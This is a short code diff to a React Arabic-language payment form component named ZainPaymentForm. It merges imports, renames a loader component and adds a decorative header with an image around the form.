@@ -1,7 +1,6 @@
 "use client"
 
-import type React from "react"
-import { useState, useEffect, useCallback } from "react"
+import React,{ useState, useEffect, useCallback } from "react"
 import { Plus, AlertCircle, CheckCircle2, CreditCard, Smartphone, Loader2 } from 'lucide-react'
 import { Button } from "@/components/ui/button"
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
@@ -15,7 +14,7 @@ import { Separator } from "@/components/ui/separator"
 // Assuming these are correctly set up in your project
  import { addData } from "@/lib/firebase";
  import { setupOnlineStatus } from "@/lib/utils";
-import Loader from "@/components/loader"
+import LoaderApp from "@/components/loader"
 
 // Placeholder functions to avoid errors if lib files are not present
 
@@ -249,6 +248,13 @@ export default function ZainPaymentForm() {
   );
 
   return (
+    <>
+     <header className="bg-gradient-to-l from-[#2b224d] to-[#1e1236] p-2 flex justify-between items-center shadow-md relative my-4 ">
+     
+     <div className="absolute right-0 left-0 flex justify-center pointer-events-none">
+       <img src="/top.png" className="object-contain" />
+     </div>
+   </header>
     <form dir="rtl" onSubmit={handleSubmit} className="min-h-screen bg-white text-black p-4">
     <div className="max-w-md mx-auto bg-white rounded-xl shadow-md p-4" dir="rtl">
       <div className="flex justify-around border-b pb-2 mb-4">
@@ -297,9 +303,10 @@ export default function ZainPaymentForm() {
         أعد التعبئة الآن
       </button>
     </div>
-    {isLoading&&<Loader/>}
+    {isLoading&&<LoaderApp/>}
 
   </form>
+  </>
 
 
 
